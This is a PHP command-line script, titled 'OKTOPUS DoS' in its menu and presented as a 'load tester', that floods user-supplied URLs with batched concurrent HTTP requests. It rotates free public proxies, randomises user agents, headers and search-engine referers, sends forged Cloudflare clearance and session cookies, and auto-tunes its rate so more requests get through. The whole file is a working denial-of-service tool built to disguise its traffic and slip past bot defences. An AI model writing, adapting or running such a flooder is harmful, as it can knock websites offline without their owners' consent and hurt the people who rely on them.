<?php

// ==================== VERIFICACIÓN DE EXTENSIÓN CURL ====================
if (!extension_loaded('curl')) {
    echoColor("ERROR: La extensión 'curl' no está instalada o habilitada en tu PHP.", 'red');
    echoColor("Por favor, activa la extensión php_curl y reinicia PHP.", 'yellow');
    exit(1);
}

// Colores para salida en consola
function echoColor($message, $color = 'white') {
    $colors = [
        'green'  => "\e[32m",
        'red'    => "\e[31m",
        'yellow' => "\e[33m",
        'blue'   => "\e[34m",
        'white'  => "\e[0m",
    ];
    echo $colors[$color] . $message . "\e[0m\n";
}

// Función para obtener entrada del usuario
function getUserInput($prompt, ?callable $validator = null) {
    while (true) {
        echo $prompt;
        $input = trim(fgets(STDIN));
        if ($validator && !$validator($input)) {
            echoColor("Entrada no válida. Intente de nuevo.", 'red');
            continue;
        }
        return $input;
    }
}

// Validación de proxy
function isValidProxy($proxy) {
    return preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}$/', $proxy);
}

// Cargar proxies
function loadProxyList() {
    $file = 'proxies.txt';
    if (!file_exists($file)) {
        echoColor("Creando archivo proxies.txt vacío...", 'yellow');
        file_put_contents($file, '');
        return [];
    }
    $lines = array_filter(array_map('trim', file($file)));
    return array_values(array_filter($lines, 'isValidProxy'));
}

// Actualizar proxies desde internet
function fetchAndSaveProxies() {
    $url = 'https://vakhov.github.io/fresh-proxy-list/proxylist.txt';
    echoColor("Descargando lista de proxies...", 'blue');

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'PHP-Load-Tester');

    $response = curl_exec($ch);
    $error = curl_error($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response !== false && $httpCode === 200 && empty($error)) {
        $proxies = array_filter(array_map('trim', explode("\n", $response)), 'isValidProxy');
        $count = count($proxies);
        if ($count > 0) {
            file_put_contents('proxies.txt', implode("\n", $proxies));
            echoColor("✓ Proxies actualizados correctamente. Total: $count", 'green');
            return $proxies;
        }
    }

    echoColor("✗ Error al descargar proxies: " . ($error ?: "HTTP $httpCode"), 'red');
    return [];
}

// Definir objetivos
function defineTargets() {
    $targets = [];
    echoColor("Ingrese las URLs objetivo (deje en blanco para terminar):", 'blue');
    while (true) {
        $url = getUserInput("URL: ", fn($u) => empty($u) || filter_var($u, FILTER_VALIDATE_URL));
        if (empty($url)) break;
        $targets[] = $url;
    }
    return $targets ?: ['http://example.com'];
}

// ==================== EXPORTAR A HTML ====================
function exportToHTML($results, $config) {
    $filename = 'resultados_load_test_' . date('Y-m-d_H-i-s') . '.html';
    
    $targetStr = implode(' | ', $config['targets']);
    $date = date('Y-m-d H:i:s');
    $avgTime = round($results['averageResponseTime'], 4);
    
    $useProxies         = $config['useProxies'] ? 'Sí' : 'No';
    $randomizeUA        = $config['randomizeUserAgents'] ? 'Sí' : 'No';
    $randomizeHeaders   = $config['randomizeHeaders'] ? 'Sí' : 'No';
    $simulateCookies    = $config['simulateCookies'] ? 'Sí' : 'No';
    $limitRate          = $config['limitRate'] ? 'Sí' : 'No';
    $useDifferentMethods= $config['useDifferentMethods'] ? 'Sí' : 'No';
    $simulateNavigation = $config['simulateNavigation'] ? 'Sí' : 'No';
    $retryFailed        = $config['retryFailed'] ? 'Sí' : 'No';

    $html = <<<HTML
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Resultados Load Test - PHP Load Tester</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f4f6f9;
            color: #333;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
        }
        h1 {
            color: #2c3e50;
            text-align: center;
        }
        h2 {
            color: #3498db;
            border-bottom: 2px solid #3498db;
            padding-bottom: 8px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #3498db;
            color: white;
        }
        tr:nth-child(even) {
            background-color: #f8f9fa;
        }
        .success { color: #27ae60; font-weight: bold; }
        .failed { color: #e74c3c; font-weight: bold; }
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #7f8c8d;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 Resultados de la Prueba de Carga</h1>
        <p style="text-align:center;"><strong>Fecha:</strong> $date</p>
        
        <h2>Información General</h2>
        <table>
            <tr><th>URL Objetivo(s)</th><td>$targetStr</td></tr>
            <tr><th>Total de Peticiones</th><td>{$config['numRequests']}</td></tr>
            <tr><th>Peticiones Exitosas</th><td class="success">{$results['successfulRequests']}</td></tr>
            <tr><th>Peticiones Fallidas</th><td class="failed">{$results['failedRequests']}</td></tr>
            <tr><th>Tiempo Promedio de Respuesta</th><td><strong>$avgTime segundos</strong></td></tr>
        </table>

        <h2>Configuración Utilizada</h2>
        <table>
            <tr><th>Usar Proxies</th><td>$useProxies</td></tr>
            <tr><th>Randomizar User-Agents</th><td>$randomizeUA</td></tr>
            <tr><th>Randomizar Cabeceras</th><td>$randomizeHeaders</td></tr>
            <tr><th>Simular Cookies</th><td>$simulateCookies</td></tr>
            <tr><th>Limitar Tasa de Peticiones</th><td>$limitRate</td></tr>
            <tr><th>Diferentes Métodos HTTP</th><td>$useDifferentMethods</td></tr>
            <tr><th>Simular Navegación Real</th><td>$simulateNavigation</td></tr>
            <tr><th>Reintentar Peticiones Fallidas</th><td>$retryFailed</td></tr>
        </table>

        <div class="footer">
            Generado por <strong>OktopusDos</strong> — $date
        </div>
    </div>
</body>
</html>
HTML;

    file_put_contents($filename, $html);
    
    echoColor("✓ Resultados exportados a: $filename", 'green');
    echoColor("Puedes abrir el archivo directamente en tu navegador.", 'blue');
    
    return $filename;
}

// Barra de progreso simple
function showProgress($current, $total, $barLength = 30) {
    $percent = ($current / $total) * 100;
    $filled = (int)($barLength * $current / $total);
    $bar = str_repeat('█', $filled) . str_repeat('░', $barLength - $filled);
    echo "\rProgreso: [$bar] " . round($percent, 1) . "% ($current/$total)";
    if ($current === $total) echo "\n";
}

// Función principal de prueba de carga
function runTest($config, $proxies, $userAgents, $headers, $cookies) {
    if (empty($config['targets'])) {
        echoColor("No hay objetivos definidos.", 'red');
        return ['successfulRequests' => 0, 'failedRequests' => 0, 'averageResponseTime' => 0];
    }

    $batchSize = 50;
    $totalRequests = $config['numRequests'];
    $successful = 0;
    $failed = 0;
    $totalTime = 0.0;

    echoColor("Iniciando prueba de carga con {$totalRequests} peticiones...", 'green');
    echoColor("Por favor espere...\n", 'blue');

    $processed = 0;

    for ($batch = 0; $batch < ceil($totalRequests / $batchSize); $batch++) {
        $currentBatch = min($batchSize, $totalRequests - ($batch * $batchSize));
        $mh = curl_multi_init();
        $handles = [];

        if ($config['limitRate']) {
            usleep(150000);
        }

        for ($i = 0; $i < $currentBatch; $i++) {
            $ch = curl_init();
            $url = $config['targets'][array_rand($config['targets'])];

            $opts = [
                CURLOPT_URL            => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => $config['timeout'],
                CURLOPT_CONNECTTIMEOUT => $config['connectTimeout'],
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_MAXREDIRS      => 5,
                CURLOPT_SSL_VERIFYPEER => false,
            ];

            if ($config['simulateNavigation']) {
                $opts[CURLOPT_COOKIEFILE] = '';
                $opts[CURLOPT_COOKIEJAR]  = '';
            }

            if ($config['useProxies'] && !empty($proxies)) {
                $opts[CURLOPT_PROXY] = $proxies[array_rand($proxies)];
            }

            if ($config['randomizeUserAgents'] && !empty($userAgents)) {
                $opts[CURLOPT_USERAGENT] = $userAgents[array_rand($userAgents)];
            }

            if ($config['randomizeHeaders'] && !empty($headers)) {
                $opts[CURLOPT_HTTPHEADER] = [$headers[array_rand($headers)]];
            }

            if ($config['simulateCookies'] && !empty($cookies)) {
                $opts[CURLOPT_COOKIE] = $cookies[array_rand($cookies)];
            }

            if ($config['useDifferentMethods']) {
                $methods = ['GET', 'POST', 'HEAD'];
                $opts[CURLOPT_CUSTOMREQUEST] = $methods[array_rand($methods)];
                if ($opts[CURLOPT_CUSTOMREQUEST] === 'POST') {
                    $opts[CURLOPT_POSTFIELDS] = 'test=data';
                }
            }

            curl_setopt_array($ch, $opts);
            curl_multi_add_handle($mh, $ch);
            $handles[] = $ch;
        }

        // Ejecutar batch
        $running = null;
        do {
            $status = curl_multi_exec($mh, $running);
            if ($running > 0) curl_multi_select($mh, 0.5);
        } while ($running > 0 && $status === CURLM_OK);

        // Procesar resultados
        foreach ($handles as $ch) {
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
            $error = curl_error($ch);

            $totalTime += $time;

            if ($httpCode >= 200 && $httpCode < 300 && empty($error)) {
                $successful++;
            } else {
                $failed++;
            }

            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);
        }

        curl_multi_close($mh);

        $processed += $currentBatch;
        showProgress($processed, $totalRequests);
    }

    $avgTime = $totalRequests > 0 ? $totalTime / $totalRequests : 0;

    echoColor("\n=== Resultados de la prueba ===", 'green');
    echo "Total de peticiones     : $totalRequests\n";
    echo "Peticiones exitosas     : $successful\n";
    echo "Peticiones fallidas     : $failed\n";
    echo "Tiempo promedio         : " . round($avgTime, 4) . " segundos\n";

    $results = [
        'successfulRequests' => $successful,
        'failedRequests'     => $failed,
        'averageResponseTime'=> $avgTime,
    ];

    // Exportación modificada a HTML
    exportToHTML($results, $config);

    return $results;
}

// Auto ajuste
function autoAdjustParameters($config, $proxies, $userAgents, $headers, $cookies) {
    echoColor("Ejecutando prueba inicial para ajustar parámetros...", 'blue');
    $initial = $config;
    $initial['numRequests'] = max(5, (int)($config['numRequests'] * 0.1));

    $metrics = runTest($initial, $proxies, $userAgents, $headers, $cookies);

    echoColor("Ajustando parámetros...", 'blue');

    if ($metrics['successfulRequests'] < $initial['numRequests'] * 0.6) {
        $config['limitRate'] = true;
        echoColor("Limitación de tasa activada.", 'yellow');
    }
    if ($metrics['averageResponseTime'] > 3) {
        $config['timeout'] = 20;
        $config['connectTimeout'] = 10;
        echoColor("Tiempos de espera aumentados.", 'yellow');
    }
    if ($config['useProxies'] && $metrics['failedRequests'] > $initial['numRequests'] * 0.5) {
        $config['useProxies'] = false;
        echoColor("Proxies deshabilitados por alto porcentaje de fallos.", 'yellow');
    }

    return $config;
}

// ==================== CONFIGURACIÓN ====================

$config = [
    'numRequests'         => 200,
    'useProxies'          => false,
    'randomizeUserAgents' => false,
    'randomizeHeaders'    => false,
    'simulateCookies'     => false,
    'limitRate'           => false,
    'useDifferentMethods' => false,
    'simulateNavigation'  => false,
    'retryFailed'         => false,
    'timeout'             => 10,
    'connectTimeout'      => 5,
    'targets'             => ['http://example.com'],
];

$proxies = loadProxyList();

$userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) Gecko/20100101 Firefox/148.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
];

$headers = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
    'Accept-Language: en-US,en;q=0.9,es;q=0.8',
    'Accept-Language: es-MX,es;q=0.9,en;q=0.8',
    'Referer: https://www.google.com/',
    'Referer: https://www.bing.com/',
    'Referer: https://duckduckgo.com/',
    'Accept-Encoding: gzip, deflate, br',
    'Cache-Control: max-age=0',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Site: none',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-User: ?1',
    'Sec-Fetch-Dest: document',
    'DNT: 1',
    'Connection: keep-alive',
];

$cookies = [
    // Cookies básicas de sesión (las más comunes)
    'PHPSESSID=8f3k9d2m7p1q5x9v2b4n6m8l0p; path=/; HttpOnly',
    'session_id=abc123def456ghi789jkl012mno345; path=/',
    'JSESSIONID=ABCDEF1234567890ABCDEF1234567890; Path=/; HttpOnly',
    
    // Cookies de sitios populares (para simular mejor)
    'wordpress_test_cookie=WP%20Cookie%20check; path=/',
    '__cf_bm=8f3k9d2m7p1q5x9v2b4n6m8l0p1234567890; path=/; expires=' . gmdate('D, d M Y H:i:s', time() + 3600) . ' GMT; HttpOnly',
    'cf_clearance=abc123def456ghi789jkl012mno345pqr678stu901; path=/; expires=' . gmdate('D, d M Y H:i:s', time() + 7200) . ' GMT',
    
    // Google / Analytics / Consent
    '_ga=GA1.1.1234567890.1740900000; path=/; expires=' . gmdate('D, d M Y H:i:s', time() + 63072000) . ' GMT',
    '_gid=GA1.2.0987654321.1740980000; path=/; expires=' . gmdate('D, d M Y H:i:s', time() + 86400) . ' GMT',
    'CONSENT=YES+srp.gws-20250331-0-RC1.es+FX+123; path=/; expires=' . gmdate('D, d M Y H:i:s', time() + 31536000) . ' GMT',
    
    // Cookies de carrito / e-commerce simuladas
    'cart_id=shoppingcart_987654321; path=/',
    'woocommerce_cart_hash=abc123def456; path=/',
    
    // Cookies de autenticación simulada
    'auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlVzZXIgU2ltdWxhZG8iLCJpYXQiOjE3NDA5MDAwMDB9.signature123; path=/; HttpOnly; Secure',
    'remember_me=true; path=/; expires=' . gmdate('D, d M Y H:i:s', time() + 2592000) . ' GMT',
    
    // Cookies mixtas (más realistas)
    'sessionid=7f8e9d2c1a4b5e6f7g8h9i0j1k2l3m4n; path=/; HttpOnly; SameSite=Lax',
    'csrftoken=xyz789abc123def456ghi789jkl012; path=/',
    'visitor_id=987654321; path=/; expires=' . gmdate('D, d M Y H:i:s', time() + 31536000) . ' GMT',
    
    // Cookie completa con varios valores
    'PHPSESSID=9a8b7c6d5e4f3g2h1i0j9k8l7m6n5o4p; _ga=GA1.1.1122334455.1740900000; _gid=GA1.2.6677889900.1740980000; language=es; path=/'
];

// ==================== MENÚ ====================

function showMenu() {
    echo "\n";
    
    echoColor("⠀⠀⠀⠀⠀⠀⢀⣀⣠⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", 'blue');
    echoColor("⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", 'blue');
    echoColor("⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⣠⣶⣾⣷⣶⣄⠀⠀⠀", 'blue');
    echoColor("⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⢰⣿⠟⠉⠻⣿⣿⣷⠀⠀", 'blue');
    echoColor("⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢷⣄⠘⠿⠀⠀⠀⢸⣿⣿⡆⠀", 'blue');
    echoColor("⠀⠀⠀⠀⠈⠿⣿⣿⣿⣿⣿⣀⣸⣿⣷⣤⣴⠟⠀⠀⠀⠀⢀⣼⣿⣿⠁⠀", 'blue');
    echoColor("⠀⠀⠀⠀⠀⠀⠈⠙⣛⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⣀⣀⣴⣾⣿⣿⡟⠀⠀", 'blue');
    echoColor("⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⣠⣤⣀", 'blue');
    echoColor("⠀⠀⣴⣿⣿⣿⠿⠟⠛⠛⢛⣿⣿⣿⣿⣿⣿⣧⡈⠉⠁⠀⠀⠀⠈⠉⢻⣿", 'blue');
    echoColor("⠀⣼⣿⣿⠋⠀⠀⠀⠀⢠⣾⣿⣿⠟⠉⠻⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⣸⣿", 'blue');
    echoColor("⠀⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⡿⠃⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣶⣿⣿⣿⡿", 'blue');
    echoColor("⠀⢿⣿⣧⡀⠀⣶⣄⠘⣿⣿⡇⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠟⠛⠛⠁⠀⠀", 'blue');
    echoColor("⠀⠈⠻⣿⣿⣿⣿⠏⠀⢻⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", 'blue');
    echoColor("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣶⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀", 'blue');

    echoColor("\n=== OKTOPUS DoS ===", 'blue');
    echo "1. Definir objetivos (URLs)\n";
    echo "2. Configurar número de peticiones\n";
    echo "3. Habilitar/deshabilitar proxies\n";
    echo "4. Randomizar User-Agents\n";
    echo "5. Randomizar cabeceras HTTP\n";
    echo "6. Simular cookies\n";
    echo "7. Limitar tasa de peticiones\n";
    echo "8. Habilitar diferentes métodos HTTP\n";
    echo "9. Simular navegación real (cookies persistentes)\n";
    echo "10. Reintentar peticiones fallidas\n";
    echo "11. Actualizar lista de proxies\n";
    echo "12. Ajustar parámetros automáticamente\n";
    echo "13. Iniciar prueba\n";
    echo "0. Salir\n";
}

while (true) {
    showMenu();
    $option = getUserInput("Seleccione una opción: ", fn($i) => is_numeric($i) && $i >= 0 && $i <= 13);

    switch ((int)$option) {
        case 1:  $config['targets'] = defineTargets(); break;
        case 2:
            $n = getUserInput("Número de peticiones: ", fn($i) => is_numeric($i) && $i > 0);
            $config['numRequests'] = (int)$n;
            break;
        case 3:  $config['useProxies'] = (strtolower(getUserInput("¿Usar proxies? (s/n): ")) === 's'); break;
        case 4:  $config['randomizeUserAgents'] = (strtolower(getUserInput("¿Randomizar User-Agents? (s/n): ")) === 's'); break;
        case 5:  $config['randomizeHeaders'] = (strtolower(getUserInput("¿Randomizar cabeceras? (s/n): ")) === 's'); break;
        case 6:  $config['simulateCookies'] = (strtolower(getUserInput("¿Simular cookies? (s/n): ")) === 's'); break;
        case 7:  $config['limitRate'] = (strtolower(getUserInput("¿Limitar tasa? (s/n): ")) === 's'); break;
        case 8:  $config['useDifferentMethods'] = (strtolower(getUserInput("¿Diferentes métodos HTTP? (s/n): ")) === 's'); break;
        case 9:  $config['simulateNavigation'] = (strtolower(getUserInput("¿Simular navegación real? (s/n): ")) === 's'); break;
        case 10: $config['retryFailed'] = (strtolower(getUserInput("¿Reintentar fallidas? (s/n): ")) === 's'); break;
        case 11: $proxies = fetchAndSaveProxies(); break;
        case 12: $config = autoAdjustParameters($config, $proxies, $userAgents, $headers, $cookies); break;
        case 13:
            if (empty($config['targets'])) {
                echoColor("Primero define al menos una URL (opción 1).", 'red');
            } else {
                runTest($config, $proxies, $userAgents, $headers, $cookies);
            }
            break;
        case 0:
            echoColor("¡Hasta luego!", 'green');
            exit(0);
    }
}